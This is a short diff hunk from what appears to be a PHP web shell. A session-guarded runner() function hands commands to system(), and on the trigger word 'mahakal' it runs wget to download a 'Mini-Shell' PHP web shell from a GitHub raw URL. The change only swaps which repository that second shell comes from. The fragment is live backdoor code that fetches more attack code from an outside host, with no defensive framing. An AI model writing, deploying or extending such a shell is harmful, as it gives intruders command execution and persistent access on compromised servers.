@@ -250,7 +250,7 @@ if(isset($_POST["fuckedserver"]) && isset($_SESSION["auth"])){
 
 function runner($command){
         if ($command == "mahakal") {
-            system("wget https://raw.githubusercontent.com/Anon-Exploiter/Mini-Shell/master/mini_shell.php");
+            system("wget https://raw.githubusercontent.com/trhacknon/Mini-Shell/master/mini_shell.php");
         }
         else {
             $ex = $command;
